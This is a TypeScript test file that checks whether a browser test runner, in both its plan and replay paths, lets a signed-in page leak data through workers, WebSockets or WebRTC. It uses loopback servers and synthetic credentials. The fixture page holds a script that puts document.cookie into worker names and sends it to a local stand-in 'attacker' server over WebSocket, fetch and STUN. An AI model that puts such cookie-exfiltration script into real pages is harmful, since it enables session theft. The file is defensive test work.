/**
 * Worker WebSockets and WebRTC must not leave a signed-in context.
 * Loopback only. Synthetic values. An upgrade listener counts sockets,
 * because a request handler does not see every WebSocket handshake.
 */

import { createServer, type IncomingMessage, type ServerResponse } from 'node:http';
import { createSocket, type Socket } from 'node:dgram';
import { mkdtempSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import { createMemorySecretProvider, establishFormAuth } from '../src/index.js';
import { runPlan } from '../src/runner/index.js';
import { replayTraces } from '../src/runner/replay.js';
import type { LLM } from '../src/llm/index.js';
import type { TestPlan } from '../src/types.js';

const USER = 'poc-user-7a1b2c3d4e@example.test';
const PASSWORD = 'poc-pass-0f9e8d7c6b';
const COOKIE = 'poc-cookie-1a2b3c4d5e6f';

function listen(handler: (req: IncomingMessage, res: ServerResponse) => void) {
  const server = createServer(handler);
  return new Promise<{ origin: string; server: import('node:http').Server; close: () => Promise<void> }>((resolve, reject) => {
    server.listen(0, '127.0.0.1', () => {
      const address = server.address();
      if (!address || typeof address === 'string') {
        reject(new Error('no port'));
        return;
      }
      resolve({
        origin: `http://127.0.0.1:${address.port}`,
        server,
        close: () => new Promise(done => {
          server.closeAllConnections?.();
          server.close(() => done());
        }),
      });
    });
  });
}

const llm = {
  providerLabel: 'stub',
  async generateJSON() {
    return { tool: 'noop', target: 'page', rationale: 'stay', siteType: 'app', summary: 'Synthetic page.' };
  },
} as LLM;

describe('worker and webrtc egress', () => {
  let appOrigin = '';
  let closeAll: () => Promise<void> = async () => {};
  const upgrades: string[] = [];
  const udpPackets: number[] = [];
  let udp: Socket;

  beforeAll(async () => {
    const attacker = await listen((_req, res) => {
      res.writeHead(204);
      res.end();
    });
    attacker.server.on('upgrade', (req, socket) => {
      upgrades.push(`${req.url || ''} ${req.headers.cookie || ''}`);
      socket.destroy();
    });
    udp = createSocket('udp4');
    await new Promise<void>(resolve => udp.bind(0, '127.0.0.1', () => resolve()));
    const udpPort = udp.address().port;
    udp.on('message', message => { udpPackets.push(message.length); });

    const app = await listen(async (req, res) => {
      const url = new URL(req.url || '/', appOrigin || 'http://127.0.0.1');
      const chunks: Buffer[] = [];
      for await (const chunk of req) chunks.push(Buffer.isBuffer(chunk) ? chunk : Buffer.from(chunk));
      if (req.method === 'POST' && url.pathname === '/login') {
        res.writeHead(302, { location: '/app', 'set-cookie': `session=${COOKIE}; Path=/` });
        res.end();
        return;
      }
      if (url.pathname === '/login') {
        res.writeHead(200, { 'content-type': 'text/html' });
        res.end('<form method="post" action="/login"><input name="email" type="email"><input name="password" type="password"><button type="submit">Sign in</button></form>');
        return;
      }
      if (url.pathname === '/worker.js') {
        res.writeHead(200, { 'content-type': 'application/javascript' });
        res.end(`const target = ${JSON.stringify(attacker.origin)};
          try { new WebSocket(target.replace('http', 'ws') + '/worker-ws?c=' + encodeURIComponent(self.name || '')); } catch (e) {}
          fetch(target + '/worker-fetch').catch(() => {});`);
        return;
      }
      if (url.pathname === '/app') {
        res.writeHead(200, { 'content-type': 'text/html' });
        res.end('<p id="ready">Signed in</p>');
        return;
      }
      res.writeHead(200, { 'content-type': 'text/html' });
      res.end(`<!doctype html><title>App</title><p id="ready">Welcome</p>
        <script>
          try { new Worker('/worker.js', { name: document.cookie }); } catch (e) {}
          try { new SharedWorker('/worker.js?shared=1', { name: 'shared-' + document.cookie }); } catch (e) {}
          try { new WebSocket(${JSON.stringify(attacker.origin.replace('http', 'ws') + '/page-ws')}); } catch (e) {}
          try {
            const pc = new RTCPeerConnection({ iceServers: [
              { urls: 'stun:127.0.0.1:${udpPort}' },
              { urls: 'turn:127.0.0.1:${udpPort}', username: 'turn-user', credential: 'turn-secret' },
            ] });
            pc.createDataChannel('leak');
            pc.createOffer().then(offer => pc.setLocalDescription(offer));
          } catch (e) {}
        </script>`);
    });
    appOrigin = app.origin;
    closeAll = async () => {
      udp.close();
      await app.close();
      await attacker.close();
    };
  });

  afterAll(async () => { await closeAll(); });

  function plan(): TestPlan {
    return {
      startUrl: `${appOrigin}/egress`,
      siteType: 'app',
      flows: [{
        id: 'visit',
        name: 'Visit',
        description: 'open',
        kind: 'happy_path',
        startUrl: `${appOrigin}/egress`,
        steps: [{ action: 'Look at the page' }],
        expectation: 'Welcome is visible',
        outcomeCheck: { kind: 'text_visible', value: 'Welcome' },
        severityIfFails: 'minor',
      }],
    };
  }

  async function jar() {
    const auth = await establishFormAuth({
      targetUrl: `${appOrigin}/login`,
      provider: createMemorySecretProvider({ username: USER, password: PASSWORD }),
      headless: true,
      postLoginSelector: '#ready',
    });
    expect(auth.ok).toBe(true);
    if (!auth.ok) throw new Error('fixture sign-in failed');
    return auth;
  }

  function leaked(): boolean {
    return upgrades.length > 0 || udpPackets.length > 0;
  }

  it('runPlan does not let a worker socket or STUN packet leave', async () => {
    upgrades.length = 0;
    udpPackets.length = 0;
    const auth = await jar();
    const dir = mkdtempSync(join(tmpdir(), 'mt-worker-'));
    await runPlan(plan(), llm, {
      screenshotsDir: dir,
      headless: true,
      recordVideo: false,
      storageState: auth.storageState,
      authOrigin: auth.authOrigin,
    });
    await new Promise(resolve => setTimeout(resolve, 1200));
    expect(leaked()).toBe(false);
  });

  it('replayTraces does not let a worker socket or STUN packet leave', async () => {
    upgrades.length = 0;
    udpPackets.length = 0;
    const auth = await jar();
    const dir = mkdtempSync(join(tmpdir(), 'mt-worker-replay-'));
    await replayTraces([{
      version: 1,
      flowId: 'visit',
      name: 'Visit',
      startUrl: `${appOrigin}/egress`,
      steps: [{
        index: 0,
        action: 'Open',
        tool: 'goto',
        urlAfter: `${appOrigin}/egress`,
        status: 'passed',
      }],
    }], {
      screenshotsDir: dir,
      headless: true,
      recordVideo: false,
      storageState: auth.storageState,
      authOrigin: auth.authOrigin,
    });
    await new Promise(resolve => setTimeout(resolve, 1200));
    expect(leaked()).toBe(false);
  });
});
